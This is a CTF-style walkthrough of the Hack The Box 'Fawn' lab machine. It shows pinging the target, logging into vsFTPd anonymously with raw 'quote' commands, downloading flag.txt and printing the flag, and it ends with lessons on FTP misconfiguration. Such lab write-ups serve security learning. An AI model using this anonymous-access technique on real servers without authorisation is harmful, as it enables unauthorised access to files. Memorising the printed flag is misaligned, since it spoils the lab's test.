# HTB - Starting Point - Fawn

🇧🇷 [Versão em Português](./README.pt-BR.md)

| Info         | Detail        |
|--------------|---------------|
| Platform     | Hack The Box  |
| Track        | Starting Point|
| Difficulty   | Very Easy     |
| OS           | Linux         |
| Status       | ✅ Completed  |

## Table of Contents
- [HTB - Starting Point - Fawn](#htb---starting-point---fawn)
  - [Table of Contents](#table-of-contents)
  - [Recon](#recon)
    - [Connectivity check](#connectivity-check)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)
  - [Flag](#flag)
  - [Lessons Learned](#lessons-learned)

---

## Recon

I started the target machine through the HTB platform, which provided the target's IP address:

**Target IP:** `10.129.160.55`

I then connected to the Pwnbox (HTB's attack machine) and, through it, connected to the target's network via VPN.

### Connectivity check

To confirm the target was reachable, I ran a `ping`:

```bash
ping 10.129.160.55
```

```
64 bytes from 10.129.160.55: icmp_seq=1 ttl=63 time=7.39 ms
64 bytes from 10.129.160.55: icmp_seq=2 ttl=63 time=7.50 ms
64 bytes from 10.129.160.55: icmp_seq=3 ttl=63 time=7.63 ms
```

The host responded normally, confirming it was online and reachable over the VPN.

---

## Enumeration

Before diving in, I checked the `ftp` client's usage/help menu to review its available flags:

```bash
ftp -?
```

I then connected to the target on the default FTP port:

```bash
ftp 10.129.160.55
```

The service banner identified the server as **vsFTPd 3.0.3**.

I first tried logging in as `root`, but the credentials were rejected:

```
Name (10.129.160.55:root): root
530 Login incorrect.
```

Since FTP servers are frequently misconfigured to allow anonymous access, I tried that next, using the raw FTP protocol commands via `quote`:

```bash
quote USER anonymous
quote PASS anonymous@
```

```
331 Please specify the password.
230 Login successful.
```

Anonymous login was accepted.

---

## Exploitation

Once authenticated, I checked the client's internal help menu to review available commands:

```bash
?
```

I listed the contents of the remote directory:

```bash
ls
```

```
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
```

A readable `flag.txt` file was present. I downloaded it to my local machine:

```bash
get flag.txt
```

```
226 Transfer complete.
32 bytes received in 00:00 (4.28 KiB/s)
```

I closed the FTP session and read the file locally:

```bash
bye
cat flag.txt
```

---

## Flag

```
035db21c881520061c53e0536e44f815
```

---

## Lessons Learned

- FTP (vsFTPd) is a plaintext protocol — credentials and transferred data travel unencrypted over the network.
- Anonymous FTP access is a common misconfiguration that can expose sensitive files without requiring any valid credentials.
- The `quote` command is useful for sending raw protocol commands directly to the server, which is handy when a client doesn't expose the desired action natively.
- Always enumerate services thoroughly (banners, available commands, directory listings) before assuming a dead end.